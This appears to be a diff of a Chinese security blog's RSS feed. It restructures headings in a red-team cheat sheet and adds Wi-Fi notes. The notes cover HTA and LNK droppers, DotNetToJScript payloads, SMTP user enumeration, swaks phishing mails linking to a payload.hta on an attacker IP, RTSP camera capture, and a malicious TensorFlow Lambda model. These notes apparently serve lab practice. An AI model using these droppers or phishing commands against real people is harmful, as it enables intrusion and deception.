@@ -306,9 +306,9 @@
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
         <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
-        <description>&lt;h1 id=&#34;钓鱼相关-投放器构造-载荷构造&#34;&gt;钓鱼相关-投放器构造-载荷构造
-&lt;/h1&gt;&lt;h2 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
-&lt;/h2&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
+        <description>&lt;h2 id=&#34;钓鱼相关&#34;&gt;钓鱼相关
+&lt;/h2&gt;&lt;h3 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
+&lt;/h3&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;head&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;script language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JScript&amp;#34;&lt;/span&gt;&amp;gt;
@@ -320,8 +320,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;script&amp;gt;self.close&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;&amp;lt;/script&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/html&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lnk投放快捷方式-命令执行&#34;&gt;lnk投放（快捷方式-命令执行）
-&lt;/h2&gt;&lt;p&gt;首先需要在测试环境生成&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;lnk投放快捷方式-命令执行&#34;&gt;lnk投放（快捷方式-命令执行）
+&lt;/h3&gt;&lt;p&gt;首先需要在测试环境生成&lt;/p&gt;
 &lt;p&gt;加载反射源码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$WshShell = New-Object -ComObject WScript.Shell
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$Shortcut = $WshShell.CreateShortcut(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$env:USERPROFILE&lt;span style=&#34;color:#e6db74&#34;&gt;\Desktop\update.lnk&amp;#34;&lt;/span&gt;)
@@ -340,27 +340,27 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$Shortcut.Save()
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以利用下面的命令反向查找lnk文件指向&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$sh&lt;span style=&#34;color:#e6db74&#34;&gt; = New-Object -ComObject WScript.Shell; &lt;/span&gt;$sh&lt;span style=&#34;color:#e6db74&#34;&gt;.CreateShortcut(&amp;#39;.\target.lnk&amp;#39;).TargetPath&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;wsh载荷构筑js载荷构筑csharp载荷转换js&#34;&gt;wsh载荷构筑（js载荷构筑，csharp载荷转换js）
-&lt;/h2&gt;&lt;p&gt;dontnettojscript 转换命令&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;wsh载荷构筑js载荷构筑csharp载荷转换js&#34;&gt;wsh载荷构筑（js载荷构筑，csharp载荷转换js）
+&lt;/h3&gt;&lt;p&gt;dontnettojscript 转换命令&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DotNetToJScript.exe ExampleAssembly.dll --lang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;jscript --var&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v4 -o shell.js
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;邮件方向利用&#34;&gt;邮件方向利用
-&lt;/h1&gt;&lt;h2 id=&#34;smtp枚举用户名&#34;&gt;smtp枚举用户名
-&lt;/h2&gt;&lt;p&gt;使用工具&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;邮件方向利用&#34;&gt;邮件方向利用
+&lt;/h2&gt;&lt;h3 id=&#34;smtp枚举用户名&#34;&gt;smtp枚举用户名
+&lt;/h3&gt;&lt;p&gt;使用工具&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;github.com/cytopia/smtp-user-enum?tab&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;readme-ov-file#smiling_imp-vrfy-mode-default
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;RCPT TO模式（指点收件人发送，模拟正常邮件）&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port -M RCPT
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;VRFY模式(默认的直接测试模式)&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smtp-user-enum -U /home/wackymaker/tools/dic/userNameDict/multiplesources-users-fabian-fingerle.de.txt -D $domain -t $ip -m $线程数 -p $port
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;邮件钓鱼-投放载荷or恶意链接&#34;&gt;邮件钓鱼-投放载荷or恶意链接
-&lt;/h2&gt;&lt;p&gt;一般需要将各种模式都测试一下&lt;/p&gt;
-&lt;h3 id=&#34;swaks-邮件伪造&#34;&gt;swaks-邮件伪造
-&lt;/h3&gt;&lt;h4 id=&#34;附带文件&#34;&gt;附带文件
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Subject: My CV&amp;#34;&lt;/span&gt; --body &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attached my CV to this mail, thank you!&amp;#34;&lt;/span&gt; --attach @rev.doc --server 192.168.209.201
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;钓鱼链接&#34;&gt;钓鱼链接
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;swaks --body &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Please click here http://192.168.45.164/payload.hta&amp;#39;&lt;/span&gt; --add-header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&amp;#34;&lt;/span&gt; --add-header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type:text/html&amp;#34;&lt;/span&gt; --header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Subject: Issues with mail&amp;#34;&lt;/span&gt; --to Will@tricky.com --from will01@tricky.com --server 192.168.105.159
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;摄像头方向利用&#34;&gt;摄像头方向利用
-&lt;/h1&gt;&lt;h2 id=&#34;rstp服务利用&#34;&gt;rstp服务利用
-&lt;/h2&gt;&lt;p&gt;如果侦测到存在rstp服务，也就是实时视频流服务，例如&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;邮件钓鱼-投放载荷or恶意链接&#34;&gt;邮件钓鱼-投放载荷or恶意链接
+&lt;/h3&gt;&lt;p&gt;一般需要将各种模式都测试一下&lt;/p&gt;
+&lt;h4 id=&#34;swaks-邮件伪造&#34;&gt;swaks-邮件伪造
+&lt;/h4&gt;&lt;h5 id=&#34;附带文件&#34;&gt;附带文件
+&lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;swaks --to jobs@cowmotors-int.com --from amit@rocks.com --header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Subject: My CV&amp;#34;&lt;/span&gt; --body &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attached my CV to this mail, thank you!&amp;#34;&lt;/span&gt; --attach @rev.doc --server 192.168.209.201
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;钓鱼链接&#34;&gt;钓鱼链接
+&lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;swaks --body &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Please click here http://192.168.45.164/payload.hta&amp;#39;&lt;/span&gt; --add-header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&amp;#34;&lt;/span&gt; --add-header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type:text/html&amp;#34;&lt;/span&gt; --header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Subject: Issues with mail&amp;#34;&lt;/span&gt; --to Will@tricky.com --from will01@tricky.com --server 192.168.105.159
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;摄像头方向利用&#34;&gt;摄像头方向利用
+&lt;/h2&gt;&lt;h3 id=&#34;rstp服务利用&#34;&gt;rstp服务利用
+&lt;/h3&gt;&lt;p&gt;如果侦测到存在rstp服务，也就是实时视频流服务，例如&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/prolab/fullhouse/10.0.52.5&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nmap -p 22,554 -sC -sV $ip
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-06-07 10:33 EDT
@@ -398,13 +398,13 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 59.19 seconds
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;就可以利用ffmpeg截取视频流&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffmpeg -rtsp_transport tcp -i rtsp://1$ip/mpeg4 -c copy out.mp4
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;ai方向利用&#34;&gt;ai方向利用
-&lt;/h1&gt;&lt;h2 id=&#34;ai语音克隆&#34;&gt;ai语音克隆
-&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;好用的网站
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ai方向利用&#34;&gt;ai方向利用
+&lt;/h2&gt;&lt;h3 id=&#34;ai语音克隆&#34;&gt;ai语音克隆
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;好用的网站
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://app.play.ht/home（付费下载）
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://fish.audio（免费）
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;tensorflow投毒&#34;&gt;tensorflow投毒
-&lt;/h2&gt;&lt;p&gt;文章如下&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tensorflow投毒&#34;&gt;tensorflow投毒
+&lt;/h3&gt;&lt;p&gt;文章如下&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;示例生成模型代码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tensorflow &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; tf
@@ -420,9 +420,9 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(tf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keras&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;layers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Lambda(exploit))
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;compile()
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wacky.h5&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;usb方向利用&#34;&gt;usb方向利用
-&lt;/h1&gt;&lt;h2 id=&#34;linux抓取挂载usb所有信息&#34;&gt;linux抓取挂载usb所有信息
-&lt;/h2&gt;&lt;p&gt;进入系统利用mount查看挂载设备&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;usb方向利用&#34;&gt;usb方向利用
+&lt;/h2&gt;&lt;h3 id=&#34;linux抓取挂载usb所有信息&#34;&gt;linux抓取挂载usb所有信息
+&lt;/h3&gt;&lt;p&gt;进入系统利用mount查看挂载设备&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;检查这个分区/dev/sdb
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#举例如下&lt;/span&gt;
@@ -450,12 +450,53 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop0    7:0    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   10M  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; loop 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sda      8:0    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 80.1G  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; disk 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─sda1   8:1    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 80.1G  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; part /
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;利用&#34;&gt;利用
-&lt;/h3&gt;&lt;h4 id=&#34;挂载并当目录利用&#34;&gt;挂载并当目录利用
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;挂载并当目录利用&#34;&gt;挂载并当目录利用
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mkdir -p /mnt/usbimg
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mount /dev/loop0 /mnt/usbimg
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;恢复此u盘所有删除信息&#34;&gt;恢复此u盘所有删除信息
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo extundelete /dev/loop0p1 --restore-all
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;wifi无线相关&#34;&gt;wifi无线相关
+&lt;/h2&gt;&lt;h3 id=&#34;linux连接wifi相关&#34;&gt;linux连接wifi相关
+&lt;/h3&gt;&lt;p&gt;查看无线网卡状态&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iwconfig
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看wifi列表&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli dev wifi list
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;连接wifi&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli dev wifi connect &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSID&amp;#34;&lt;/span&gt; password &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt; ifname wlan0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看当前连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli con show --active
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;断开连接并删除记录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli con down id &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSID&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli con delete id &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSID&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意，如果我们不删除记录，可能在再次连接wifi的时候出现无法找到加密报错&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Error: 802-11-wireless-security.key-mgmt: property is missing.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现这种报错直接删除此wifi记录，或者手动指定加密方式(我给出的示例是wpa2)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli dev wifi connect &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSID&amp;#34;&lt;/span&gt; password &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PASSWORD&amp;#34;&lt;/span&gt; ifname wlan0 wifi-sec.key-mgmt wpa-psk
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;wireshark分析管理帧&#34;&gt;wireshark分析管理帧
+&lt;/h3&gt;&lt;p&gt;查找来自ap的接入帧&lt;/p&gt;
